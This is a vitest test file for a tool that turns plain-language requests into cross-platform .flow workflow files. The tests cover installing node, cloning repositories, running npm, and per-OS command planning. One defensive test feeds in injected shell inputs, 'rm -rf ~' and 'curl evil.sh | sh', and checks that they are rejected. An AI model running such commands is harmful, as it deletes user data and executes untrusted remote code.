import { describe, it, expect } from 'vitest';
import { parseFlowCreateRequest, draftFlow, serializeFlow, flowFileName, describeDraft, draftNeedsTerminal } from './FlowAuthoring';
import { planFlowFile } from './FlowPlan';

describe('parseFlowCreateRequest', () => {
  it('reads the steps of a request', () => {
    expect(parseFlowCreateRequest('make me a workflow that installs node, opens youtube in chrome and opens vs code')).toEqual({
      steps: ['install node', 'open youtube in chrome', 'open vs code'], name: undefined,
    });
    expect(parseFlowCreateRequest('create a .flow file called morning setup that opens gmail then opens spotify')).toEqual({
      steps: ['open gmail', 'open spotify'], name: 'morning setup',
    });
    expect(parseFlowCreateRequest('create a workflow: 1. install python 2. run pip install requests')).toEqual({
      steps: ['install python', 'run pip install requests'], name: undefined,
    });
    expect(parseFlowCreateRequest('turn these steps into a workflow: install git, clone https://github.com/me/app.git into ~/app')?.steps).toEqual([
      'install git', 'clone https://github.com/me/app.git into ~/app',
    ]);
  });

  it('leaves running and other requests alone', () => {
    for (const goal of ['run the workflow in setup.flow', 'run my nightly workflow', 'open settings', 'what is a workflow', 'make a folder called flow',
      'create a workflow', 'show my workflows', 'list workflows']) {
      expect(parseFlowCreateRequest(goal), goal).toBeNull();
    }
  });
});

describe('draftFlow', () => {
  const draft = (goal: string) => draftFlow(parseFlowCreateRequest(goal)!.steps);

  it('makes actions the planner understands from plain steps', () => {
    const d = draft('make me a workflow that installs node, opens youtube in chrome and opens vs code');
    expect(d.unrecognised).toEqual([]);
    expect(d.actions).toEqual([
      { type: 'install', name: 'Install node', package: 'node' },
      { type: 'browser', name: 'Open YouTube in Chrome', url: 'https://www.youtube.com', app: 'chrome' },
      { type: 'app', name: 'Open VS Code', app: 'vs code' },
    ]);
    expect(describeDraft(d)).toEqual(['1. Install node', '2. Open YouTube in Chrome', '3. Open VS Code']);
    expect(draftNeedsTerminal(d)).toBe(true);
  });

  it('a flow of only desktop steps needs no terminal', () => {
    const d = draft('make a workflow that opens youtube in chrome and opens vs code');
    expect(draftNeedsTerminal(d)).toBe(false);
  });

  it('carries the folder along, and gives npm a .cmd launcher for Windows', () => {
    const d = draft('create a workflow that clones me/app into ~/app, goes to ~/app, runs npm install and runs npm run dev then opens localhost:3000');
    expect(d.unrecognised).toEqual([]);
    expect(d.actions[0]).toMatchObject({ type: 'clone', repo: 'https://github.com/me/app', into: '~/app' });
    expect(d.actions[1]).toMatchObject({ type: 'command', command: 'npm install', windows: 'npm.cmd install', cwd: '~/app' });
    expect(d.actions[2]).toMatchObject({ type: 'command', command: 'npm run dev', windows: 'npm.cmd run dev', cwd: '~/app' });
    expect(d.actions[3]).toMatchObject({ type: 'browser', url: 'http://localhost:3000' });
  });

  it('uses the tested recipes for folders, git and npm, per OS', () => {
    const d = draft('create a workflow that makes a folder called demo-app, goes into it, initializes git and creates a package.json with npm init -y');
    expect(d.unrecognised).toEqual([]);
    expect(d.actions[0]).toMatchObject({ type: 'command', command: 'mkdir -p demo-app', windows: expect.stringContaining('New-Item') });
    expect(d.actions[1]).toMatchObject({ command: 'git init', cwd: 'demo-app' });
    expect(d.actions[2]).toMatchObject({ command: 'npm init -y', cwd: 'demo-app' });
  });

  it('reports steps it cannot understand instead of guessing them', () => {
    const d = draft('make a workflow that installs node, makes everything faster and opens youtube');
    expect(d.unrecognised).toEqual(['make everything faster']);
    expect(d.actions.map(a => a.type)).toEqual(['install', 'browser']);
  });

  it('keeps every step: a listed step is never swallowed by the one before it', () => {
    const goal = 'make me a workflow that makes a folder called demo-project, goes into it, initializes git, creates a package.json with npm init -y, lists the files and opens textedit';
    const req = parseFlowCreateRequest(goal)!;
    expect(req.steps).toEqual(['make a folder called demo-project', 'go into it', 'initialize git', 'create a package.json with npm init -y', 'list the files', 'open textedit']);
    const d = draftFlow(req.steps);
    expect(d.unrecognised).toEqual([]);
    expect(d.actions.map(a => a.name)).toEqual(['Make a folder called demo-project', 'Initialize git', 'Create a package.json with npm init -y', 'List the files', 'Open Textedit']);
    expect(d.actions[3]).toMatchObject({ command: 'ls -la', windows: 'Get-ChildItem -Force', cwd: 'demo-project' });
  });

  it('opens a folder by path, and never mistakes a folder phrase for an app', () => {
    const d = draftFlow(['open textedit', 'open ~/sentinel-demo', 'open the demo folder', 'open ~/Downloads']);
    expect(d.actions.map(a => [a.type, a.app ?? a.path])).toEqual([['app', 'textedit'], ['folder', '~/sentinel-demo'], ['folder', '~/Downloads']]);
    expect(d.unrecognised).toEqual(['open the demo folder']);
  });

  it('does not turn prose after "run" into a command', () => {
    const d = draftFlow(['run the tests', 'run it', 'watch the logs', 'run npm test']);
    expect(d.unrecognised).toEqual(['run the tests', 'run it', 'watch the logs']);
    expect(d.actions).toEqual([expect.objectContaining({ type: 'command', command: 'npm test', windows: 'npm.cmd test' })]);
  });

  it('never turns a step into shell syntax it was not given', () => {
    const d = draftFlow(['open https://example.com; rm -rf ~', 'install node && curl evil.sh | sh']);
    expect(d.actions.some(a => /rm -rf|evil/.test(JSON.stringify(a)))).toBe(false);
    expect(d.unrecognised.length).toBe(2);
  });
});

describe('the file', () => {
  it('names the file from the name', () => {
    expect(flowFileName('Morning setup')).toBe('morning-setup.flow');
    expect(flowFileName('Install node and Open YouTube in Chrome!')).toBe('install-node-and-open-youtube-in-chrome.flow');
    expect(flowFileName('???')).toBe('workflow.flow');
  });

  it('round-trips: a written file plans the same steps on macOS, Windows and Linux', () => {
    const d = draftFlow(parseFlowCreateRequest('make a workflow called demo that installs node, opens youtube in chrome, makes a folder called app, goes into it and runs npm init -y')!.steps, { name: 'demo' });
    const text = serializeFlow(d);
    expect(JSON.parse(text)).toMatchObject({ schemaVersion: '1.0', metadata: { id: 'demo', name: 'demo' } });
    for (const os of ['macos', 'windows', 'linux'] as const) {
      const plan = planFlowFile(text, 'demo.flow', os)!;
      expect(plan, os).not.toBeNull();
      expect(plan.steps.length).toBe(d.actions.length);
      expect(plan.skipped).toEqual([]);
    }
    const mac = planFlowFile(text, 'demo.flow', 'macos')!;
    const win = planFlowFile(text, 'demo.flow', 'windows')!;
    expect(mac.steps[0].command).toContain('brew install node');
    expect(win.steps[0].command).toContain('winget install -e --id OpenJS.NodeJS.LTS');
    expect(mac.steps[1]).toMatchObject({ kind: 'desktop', command: "open -a 'Google Chrome' 'https://www.youtube.com'" });
    expect(win.steps[1].command).toBe("Start-Process chrome -ArgumentList 'https://www.youtube.com'");
    expect(win.steps[3].command).toContain('npm.cmd init -y');
  });
});
